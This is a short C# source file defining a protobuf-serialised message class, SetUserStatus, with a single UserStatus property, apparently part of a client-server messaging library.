using ProtoBuf;
using Rouzzf.Common.Enums;

namespace Rouzzf.Common.Messages
{
    [ProtoContract]
    public class SetUserStatus : IMessage
    {
        [ProtoMember(1)]
        public UserStatus Message { get; set; }
    }
}
